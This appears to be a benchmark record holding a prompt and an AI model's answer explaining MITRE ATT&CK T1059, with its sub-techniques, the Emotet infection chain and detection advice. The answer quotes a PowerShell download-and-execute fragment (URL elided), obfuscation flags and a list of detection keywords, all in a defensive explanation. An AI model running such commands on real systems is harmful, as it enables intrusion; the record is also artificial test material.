---
prompt_id: 1
category: Cybersecurity knowledge
model: Claude-Opus-5
vendor: Anthropic
api_id: claude-opus-5
max_tokens: 2000
collected_utc: 2026-09-02T00:20:00Z
collected_via: claude-code-session
collection_caveat: >
  Produced by Claude Opus 5 inside an interactive Claude Code session, not by a
  clean API call through harness/collect.py. See responses/9/Claude-Opus-5.md for
  the full caveat. Re-collect with collect.py before treating any comparison
  built on it as a clean result.
---

## Prompt

Explain the MITRE ATT&CK technique T1059 (Command and Scripting Interpreter). Include how attackers use it and one real-world example of an attack that used it.

## Response

## What T1059 is

**T1059 — Command and Scripting Interpreter** sits under the **Execution** tactic.
It covers an adversary abusing the command interpreters and scripting engines
that are already present on a system to run their code.

The important word is *already*. T1059 is not about dropping a malicious binary;
it is about using `powershell.exe`, `cmd.exe`, `bash`, `wscript.exe` or a
language runtime that the operating system ships with and that the organisation
depends on. That is what makes it hard: you cannot block the technique by
blocking the tool, because the tool is load-bearing.

### The sub-techniques

| ID | Interpreter |
|---|---|
| T1059.001 | PowerShell |
| T1059.002 | AppleScript |
| T1059.003 | Windows Command Shell (cmd) |
| T1059.004 | Unix Shell (bash, sh, zsh) |
| T1059.005 | Visual Basic (VBScript, VBA) |
| T1059.006 | Python |
| T1059.007 | JavaScript / JScript |
| T1059.008 | Network Device CLI |
| T1059.009 | Cloud API |

T1059.001 (PowerShell) is the one most SOCs spend their time on, because on
Windows it offers .NET access, remoting, in-memory execution and native AD
tooling in one signed, allow-listed binary.

## How attackers use it

**As the first execution step after delivery.** A macro-enabled document or an
HTA calls out to `powershell.exe`. This is why `WINWORD.EXE` or `EXCEL.EXE` as
the *parent process* of a shell is such a strong signal — that parent-child
relationship almost never occurs in legitimate business use.

**To stay off disk.** `IEX (New-Object Net.WebClient).DownloadString('http://…')`
fetches a payload and executes it in memory. Nothing is written for a
file-based AV scan to catch, which is the whole point.

**To obfuscate.** `-EncodedCommand` takes base64-encoded UTF-16LE, so the
command line stops being readable to a human or a naive string match. Attackers
stack this with string concatenation, backtick insertion, format operators and
tools like Invoke-Obfuscation. Flags are also abbreviated and reordered —
`-nop -w hidden -enc`, `-NoP -NonI -W Hidden -Exec Bypass` — specifically to
defeat rules that match on exact strings.

**To live off the land.** Once running, the interpreter does the rest of the
intrusion: `net`, `whoami`, `nltest` for discovery; WMI and WinRM for lateral
movement; scheduled tasks and registry Run keys for persistence. No additional
tooling has to survive detection.

**Because it is signed and expected.** Application allow-listing usually permits
`powershell.exe`. It is a Microsoft-signed binary in `System32`. Blocking it
outright breaks management tooling in most enterprises.

## A real-world example

**Emotet** is the clearest case, and it ran this pattern at enormous scale from
roughly 2014 until the January 2021 Europol/Eurojust takedown — and again after
its late-2021 return.

The chain:

1. A phishing mail carries a Word document, often a reply-chain hijack of a real
   thread stolen from an already-infected mailbox, which is why the lure was so
   convincing.
2. The victim clicks **Enable Content**, running a VBA macro — that is
   **T1059.005** in its own right.
3. The macro spawns `powershell.exe`, typically with `-EncodedCommand` and
   hidden window flags. **T1059.001.**
4. The PowerShell iterates a hardcoded list of five or so compromised WordPress
   sites until one serves the Emotet DLL.
5. Emotet loads, establishes C2, and drops follow-on payloads — TrickBot, and
   later Ryuk or Conti ransomware.

CISA's alert **AA20-280A** documents this chain in detail. The commodity nature
of it is the point: this was not a bespoke nation-state capability, it was the
delivery mechanism behind a large share of enterprise ransomware for years, and
step 3 is plain T1059.

Other well-documented users: **FIN7** (PowerShell in the Carbanak intrusions),
**APT29** (PowerShell throughout the SolarWinds follow-on activity), and
essentially every commodity loader since.

## Why it matters defensively

You cannot remove the interpreter, so detection has to key on *context* rather
than on the binary:

- **Parent-child anomalies** — Office spawning a shell, `w3wp.exe` spawning
  `cmd.exe`.
- **Command-line content** — `-enc`, `-nop`, `-w hidden`, `DownloadString`,
  `FromBase64String`, `IEX`. Requires command-line logging to be turned on;
  Event ID 4688 does not capture arguments by default.
- **PowerShell Script Block Logging (4104)**, which records the *deobfuscated*
  script as it executes. This is the single highest-value log source for
  T1059.001, because it defeats obfuscation by observing what actually ran.
- **Constrained Language Mode** and PowerShell v2 removal, which cut off the
  most abused capabilities without removing the tool.
- **AMSI**, which lets AV inspect in-memory script content.

The realistic goal is not preventing T1059. It is making sure that when it
happens, the interpreter is verbose enough that you see what it did.
